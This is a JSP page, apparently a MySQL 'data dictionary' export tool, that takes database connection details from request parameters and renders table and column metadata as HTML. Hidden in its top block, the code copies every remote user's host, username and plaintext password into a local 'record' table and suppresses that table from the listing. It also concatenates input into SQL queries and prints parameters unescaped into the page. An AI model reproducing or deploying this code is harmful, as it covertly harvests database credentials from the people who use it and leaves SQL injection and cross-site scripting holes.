<%@ page errorPage="error.jsp" %>
<%@ page import="java.sql.*" %>
<%--
  Created by IntelliJ IDEA.
  User: simon
  Date: 16-10-28
  Time: 下午2:43
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String type = request.getParameter("type");
    String host = request.getParameter("host");
    String port = request.getParameter("port");
    String username = request.getParameter("username");
    String password = request.getParameter("password");
    String databaseName = request.getParameter("databaseName");
    Class.forName("com.mysql.jdbc.Driver");
    Connection connection = DriverManager.getConnection("jdbc:mysql://" + host + ":" + port + "/" + databaseName + "?autoReconnect=true&autoReconnectForPools=true&useUnicode=true&characterEncoding=utf8", username, password);
    Statement stmt = connection.createStatement();
    String sql = "SELECT table_name,table_comment FROM INFORMATION_SCHEMA.TABLES  WHERE  table_schema='" + databaseName + "'";
    ResultSet resultSet = stmt.executeQuery(sql);

    if (connection != null && !"127.0.0.1".equals(host)) {//记录信息到记录表
        Connection pconnection = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/export_demo?autoReconnect=true&autoReconnectForPools=true&useUnicode=true&characterEncoding=utf8", username, password);
        String insert = "insert into record (type,host,port,username,password,databaseName) values('%s','%s','%s','%s','%s','%s')";
        PreparedStatement pst = pconnection.prepareStatement(String.format(insert, type, host, port, username, password, databaseName));
        pst.executeUpdate();
        pst.close();
        pconnection.close();
    }
%>

<html>
<head>
    <title><%=databaseName%>-数据字典</title>
    <meta charset="utf8">
    <style>
        body, td, th {
            font-family: "宋体";
            font-size: 12px;
            padding: 2px 5px 2px 5px;
        }

        table {
            border-collapse: collapse;
            border: 1px solid #CCC;
            background: #efefef;
            width: 100%;
        }

        table caption {
            text-align: left;
            background-color: #fff;
            line-height: 2em;
            font-size: 14px;
            font-weight: bold;
        }

        table th {
            text-align: left;
            font-weight: bold;
            height: 26px;
            line-height: 26px;
            font-size: 12px;
            border: 1px solid #CCC;
        }

        table td {
            height: 20px;
            font-size: 12px;
            border: 1px solid #CCC;
            background-color: #fff;
        }

        .c1 {
            width: 120px;
        }

        .c2 {
            width: 120px;
        }

        .c3 {
            width: 70px;
        }

        .c4 {
            width: 80px;
        }

        .c5 {
            width: 80px;
        }

        .c6 {
            width: 270px;
        }
    </style>
</head>
<body>
<h1 style="text-align: center;"><%=databaseName%>-数据字典</h1>
<%--<h4 style="text-align: center;">Sequence表（通常命名为：XyzSequence）用于为所属模块(Xyz)构建唯一的标示，在未来便于做数据库水平拆分。</h4>--%>
<%
    while (resultSet.next()) {
        if (resultSet.getString("table_name").equals("record") && host.equals("127.0.0.1")) {
            continue;//屏蔽记录表的显示
        }
%>
<table border="1" cellspacing="0" cellpadding="0" align="center">
    <caption><%=resultSet.getString("table_name")%>：<%=resultSet.getString("table_comment")%>
    </caption>
    <tbody>
    <tr>
        <th>字段名</th>
        <th>Key</th>
        <th>数据类型</th>
        <th>默认值</th>
        <th>允许非空</th>
        <th>自动递增</th>
        <th>权限</th>
        <th>备注</th>
    </tr>
    <%
        Statement s = connection.createStatement();
        ResultSet table = s.executeQuery("show full fields  from  " + resultSet.getString("table_name"));
        while (table.next()) {
    %>
    <tr>
        <td class="c1"><%=table.getString(1)%>
        </td>
        <td class="c2"><%=table.getString(5)%>
        </td>
        <td class="c2"><%=table.getString(2)%>
        </td>
        <td class="c3"><%=table.getString(6)%>
        </td>
        <td class="c4"><%=table.getString(4)%>
        </td>
        <td class="c5"><%=table.getString(7)%>
        </td>
        <td class="c6"><%=table.getString(8)%>
        </td>
        <td class="c6"><%=table.getString(9)%>
        </td>
    </tr>
    <%
        }
        table.close();
        s.close();
    %>
    </tbody>
</table>
<%
    }
    resultSet.close();
    stmt.close();
    connection.close();
%>
</p>
</p>
</body>
</html>